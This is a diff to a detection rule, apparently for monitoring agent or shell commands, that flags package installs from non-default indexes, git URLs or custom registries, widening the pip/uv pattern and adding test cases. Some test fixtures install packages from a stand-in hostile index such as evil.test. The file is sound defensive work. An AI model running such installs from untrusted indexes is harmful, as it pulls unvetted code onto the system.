@@ -24,7 +24,7 @@ match: >
     (
       e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(([^\\s;&|]*/)?(pip[0-9.]*|pipx|uv\\s+pip|uv\\s+tool|python[0-9.]*\\s+-m\\s+pip)\\s+install|uv\\s+add|poetry\\s+add)\\b[^;&|\\n]*?\\s['\\\"]?(git\\+|[\\w.\\[\\],-]+\\s*@\\s*(git\\+)?(https?|ssh|git|file)://|(https?|ssh|git)://[^\\s'\\\"]*\\.(whl|tar\\.gz|tgz|tar\\.bz2|zip|git)(#[^\\s'\\\"]*)?['\\\"]?(\\s|$))") ||
       e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(([^\\s;&|]*/)?(pip[0-9.]*|pipx|uv\\s+pip|uv\\s+tool|python[0-9.]*\\s+-m\\s+pip)\\s+install|uv\\s+add|poetry\\s+add)\\b[^;&|\\n]*?\\s(--extra-index-url|--trusted-host)(\\s|=)") ||
-      e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(([^\\s;&|]*/)?(pip[0-9.]*|pipx|uv\\s+pip|uv\\s+tool|python[0-9.]*\\s+-m\\s+pip)\\s+install|uv\\s+add|poetry\\s+add)\\b[^;&|\\n]*?\\s(-i|--index-url|--index)(\\s+|=)['\\\"]?(http://|https://[^\\s/'\\\"?#]*@|https://([^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#y][^\\s/:'\\\"?#]*|y(|[^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#i][^\\s/:'\\\"?#]*|i(|[^\\s/:'\\\"?#\\.][^\\s/:'\\\"?#]*|\\.(|[^\\s/:'\\\"?#o][^\\s/:'\\\"?#]*|o(|[^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#g][^\\s/:'\\\"?#]*|g([^\\s/:'\\\"?#][^\\s/:'\\\"?#]*)))))))))([:/'\\\"?#]|\\s|$))")
+      e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(([^\\s;&|]*/)?(pip[0-9.]*|pipx|uv\\s+pip|uv\\s+tool|python[0-9.]*\\s+-m\\s+pip)\\s+install|uv\\s+add|poetry\\s+add)\\b[^;&|\\n]*?\\s(-i|--index-url|--index|--default-index)(\\s+|=)['\\\"]?([\\w.-]+=)?['\\\"]?(http://|https://[^\\s/'\\\"?#]*@|https://([^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#y][^\\s/:'\\\"?#]*|y(|[^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#i][^\\s/:'\\\"?#]*|i(|[^\\s/:'\\\"?#\\.][^\\s/:'\\\"?#]*|\\.(|[^\\s/:'\\\"?#o][^\\s/:'\\\"?#]*|o(|[^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#g][^\\s/:'\\\"?#]*|g([^\\s/:'\\\"?#][^\\s/:'\\\"?#]*)))))))))([:/'\\\"?#]|\\s|$))")
     ) || (
       e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(npm\\s+(install|i|add|ci)|pnpm\\s+(add|install|i)|yarn\\s+(global\\s+)?add|bun\\s+(add|install|i))\\b[^;&|\\n]*?\\s['\\\"]?(@?[\\w./-]+@)?(git\\+|github:|gitlab:|bitbucket:|gist:|git://|ssh://|https?://[^\\s'\\\"]*\\.(tgz|tar\\.gz|git)(#[^\\s'\\\"]*)?['\\\"]?(\\s|$))") ||
       e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(npm\\s+(install|i|add|ci)|pnpm\\s+(add|install|i)|yarn\\s+(global\\s+)?add|bun\\s+(add|install|i))\\b[^;&|\\n]*?\\s--registry(\\s+|=)['\\\"]?(http://|https://[^\\s/'\\\"?#]*@|https://([^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#e][^\\s/:'\\\"?#]*|e(|[^\\s/:'\\\"?#g][^\\s/:'\\\"?#]*|g(|[^\\s/:'\\\"?#i][^\\s/:'\\\"?#]*|i(|[^\\s/:'\\\"?#s][^\\s/:'\\\"?#]*|s(|[^\\s/:'\\\"?#t][^\\s/:'\\\"?#]*|t(|[^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#y][^\\s/:'\\\"?#]*|y(|[^\\s/:'\\\"?#\\.][^\\s/:'\\\"?#]*|\\.(|[^\\s/:'\\\"?#ny][^\\s/:'\\\"?#]*|n(|[^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#m][^\\s/:'\\\"?#]*|m(|[^\\s/:'\\\"?#j][^\\s/:'\\\"?#]*|j(|[^\\s/:'\\\"?#s][^\\s/:'\\\"?#]*|s(|[^\\s/:'\\\"?#\\.][^\\s/:'\\\"?#]*|\\.(|[^\\s/:'\\\"?#o][^\\s/:'\\\"?#]*|o(|[^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#g][^\\s/:'\\\"?#]*|g([^\\s/:'\\\"?#][^\\s/:'\\\"?#]*)))))))))|y(|[^\\s/:'\\\"?#a][^\\s/:'\\\"?#]*|a(|[^\\s/:'\\\"?#r][^\\s/:'\\\"?#]*|r(|[^\\s/:'\\\"?#n][^\\s/:'\\\"?#]*|n(|[^\\s/:'\\\"?#p][^\\s/:'\\\"?#]*|p(|[^\\s/:'\\\"?#k][^\\s/:'\\\"?#]*|k(|[^\\s/:'\\\"?#g][^\\s/:'\\\"?#]*|g(|[^\\s/:'\\\"?#\\.][^\\s/:'\\\"?#]*|\\.(|[^\\s/:'\\\"?#c][^\\s/:'\\\"?#]*|c(|[^\\s/:'\\\"?#o][^\\s/:'\\\"?#]*|o(|[^\\s/:'\\\"?#m][^\\s/:'\\\"?#]*|m([^\\s/:'\\\"?#][^\\s/:'\\\"?#]*)))))))))))))))))))))([:/'\\\"?#]|\\s|$))")
@@ -167,6 +167,24 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "pip install -i http://pypi.org/simple x" }
+        session: { id: s1 }
+  - name: uv_named_index
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "uv add torch --index pytorch=https://evil.test/simple" }
+        session: { id: s1 }
+  - name: uv_default_index
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "uv pip install --default-index https://pkgs.example.test/simple x" }
+        session: { id: s1 }
+  - name: uv_named_index_default_host
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "uv add requests --index pypi=https://pypi.org/simple" }
         session: { id: s1 }
   - name: userinfo_index_bypass
     verdict: match
